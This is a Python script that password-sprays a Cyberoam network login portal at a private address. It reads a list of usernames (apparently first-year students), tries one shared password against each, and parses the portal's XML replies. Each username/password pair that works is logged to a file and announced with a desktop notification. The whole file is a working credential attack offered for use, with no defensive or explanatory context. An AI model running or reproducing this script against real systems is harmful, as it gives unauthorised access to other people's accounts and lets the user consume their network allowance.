import requests
import subprocess

def sendmessage(message):
    subprocess.Popen(['notify-send', message])
    return

url = 'http://172.16.68.6:8090/httpclient.html'
username=[]

with open("firstyear.txt") as f:
    username = f.readlines()

password='dd44rr'
add=open("working.txt","a") 
 
success = "<?xml version='1.0' ?><requestresponse><status><![CDATA[LIVE]]></status><message><![CDATA[You have successfully logged in]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n" 

dataexceed="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[Your data transfer has been exceeded, Please contact the administrator]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse> \n"

maxlogin="<?xml version='1.0' ?><requestresponse><status><![CDATA[LOGIN]]></status><message><![CDATA[You have reached Maximum Login Limit.]]></message><logoutmessage><![CDATA[You have successfully logged off]]></logoutmessage><state><![CDATA[]]></state></requestresponse>\n"
    
for i in username :
	i = i.replace("\n","")      
	values = {
	'mode':'191',
	'username':i,
	'password':password	
		  }
	r = requests.post(url, data=values)
	k = r.content
	if(k == success):
		print i	
		print "Successfully Logged in to Cyberoam"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")
		sendmessage("Successfully Logged in to Cyberoam using " + i )
	if(k == dataexceed):
		print i	
		print "Data Transfer Exceeded"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")		
		sendmessage("Data Transfer Exceeded for " + i )
	if(k == maxlogin):
		print i	
		print "Max Login Limit Reached"
		add.write(i)
		add.write("\n")
		add.write(password)
		add.write("\n")		
		sendmessage("Max Login Limit Reached for " + i )				
		


